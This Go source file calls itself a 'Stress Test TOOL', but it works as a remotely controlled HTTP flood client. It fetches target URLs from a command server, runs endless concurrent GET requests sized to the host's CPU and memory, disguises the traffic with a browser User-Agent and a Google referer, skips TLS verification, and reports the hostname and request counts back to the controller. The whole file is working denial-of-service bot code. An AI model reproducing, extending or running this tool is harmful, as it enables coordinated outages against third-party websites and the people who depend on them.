package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"sync"
	"time"

	"github.com/mackerelio/go-osstat/memory"
)

var hostDomain = "https://<host-domain>"

var workers = 8 * calcWorkers()
var connTimeOut = 5

var reqCount = 0
var reqError = 0
var targetStatus = 0

var urls []string

var wg sync.WaitGroup
var lock sync.Mutex

func main() {

	hostName, err := os.Hostname()

	if err != nil {
		fmt.Println(err.Error())
		return
	}

	if len(os.Args) > 1 {
		getTargetFromFile(os.Args[1])
	} else {
		getTarget()
		go checkStatus()
		go sendStat(hostName)
		go showStat()
	}
	runAttack()
}

func runAttack() {
	for {
		for _, url := range urls {
			for i := 0; i < workers; i++ {
				wg.Add(1)
				go stressGet(url)
			}
		}
		wg.Wait()
	}
}

func stressGet(url string) {

	fIgnoreRedirects := func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	tr := &http.Transport{
		DisableCompression: true,                                  // Disable automatic decompression
		TLSClientConfig:    &tls.Config{InsecureSkipVerify: true}, // Disable TLS verification
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		log.Fatalln(err)
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Encoding", "*")
	req.Header.Set("Referer", "https://www.google.com/")
	req.Header.Set("DNT", "1")

	client := &http.Client{
		Timeout:       time.Duration(connTimeOut) * time.Second,
		CheckRedirect: fIgnoreRedirects,
		Transport:     tr,
	}

	resp, err := client.Do(req)

	if err != nil {
		lock.Lock()
		reqError++
		lock.Unlock()
		wg.Done()
		return
	}

	_, err = io.Copy(ioutil.Discard, resp.Body)
	if err != nil {
		lock.Lock()
		reqError++
		lock.Unlock()
	}

	resp.Body.Close()

	lock.Lock()
	reqCount++
	lock.Unlock()
	wg.Done()
}

func showStat() {
	for {
		if runtime.GOOS == "windows" {
			cmd := exec.Command("cmd", "/c", "cls")
			cmd.Stdout = os.Stdout
			cmd.Run()
		} else if runtime.GOOS == "linux" {
			cmd := exec.Command("clear")
			cmd.Stdout = os.Stdout
			cmd.Run()
		} else if runtime.GOOS == "darwin" {
			cmd := exec.Command("clear")
			cmd.Stdout = os.Stdout
			cmd.Run()
		}
		fmt.Println("")
		fmt.Println("---> Stress Test TOOL v.0.1")
		fmt.Println("")
		fmt.Println("")
		fmt.Println("Targer count: ", len(urls))
		fmt.Println("")
		fmt.Println("REQ: ", reqCount)
		fmt.Println("ERROR: ", reqError)
		fmt.Println("")
		time.Sleep(5 * time.Second)
	}
}

func checkStatus() {
	for {
		newStatus := getStatus()
		if targetStatus == 0 {
			targetStatus = newStatus
		} else if newStatus > targetStatus {
			targetStatus = newStatus
			getTarget()
			fmt.Println("")
			fmt.Println("---> Tasks Update")
			fmt.Println("new targets: ", urls)
			fmt.Println("")
		}
		time.Sleep(300 * time.Second)
	}
}

func getTargetFromFile(fileName string) {
	file, err := os.Open(fileName)

	if err != nil {
		fmt.Println(err.Error())
	}

	scanner := bufio.NewScanner(file)

	scanner.Split(bufio.ScanLines)

	for scanner.Scan() {
		urls = append(urls, scanner.Text())
	}

	file.Close()
}

func getTarget() {
	req, err := http.NewRequest("GET", hostDomain+"/gettarger.php", nil)
	if err != nil {
		fmt.Println(err.Error())
	}

	req.Header.Set("Accept", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err.Error())
	}

	defer resp.Body.Close()

	b, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err.Error())
	}

	var targetArr []string
	_ = json.Unmarshal([]byte(string(b)), &targetArr)

	urls = nil
	urls = append(urls, targetArr...)
}

func sendStat(hostName string) {
	for {
		rq := fmt.Sprint(reqCount)
		req, err := http.NewRequest("GET", hostDomain+"/stat.php?host="+hostName+"&req="+rq, nil)
		if err != nil {
			fmt.Println(err.Error())
		}

		req.Header.Set("Accept", "application/json")

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println(err.Error())
		}

		resp.Body.Close()

		time.Sleep(300 * time.Second)
	}
}

func getStatus() int {
	req, err := http.NewRequest("GET", hostDomain+"/status.php", nil)
	if err != nil {
		fmt.Println(err.Error())
		return 0
	}

	req.Header.Set("Accept", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err.Error())
	}

	defer resp.Body.Close()

	b, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err.Error())
		return 0
	}

	status, _ := strconv.Atoi(string(b))

	return status
}

func calcWorkers() int {
	cores := runtime.NumCPU()

	memory, err := memory.Get()
	if err != nil {
		return 20
	}
	memoryTotal := toMB(memory.Total)

	if cores >= 6 && memoryTotal > 8000 {
		return 32
	} else if cores == 4 && memoryTotal > 4000 {
		return 20
	} else if cores == 2 && memoryTotal > 1000 {
		return 15
	} else {
		return 10
	}
}

func toMB(b uint64) uint64 {
	return b / 1024 / 1024
}
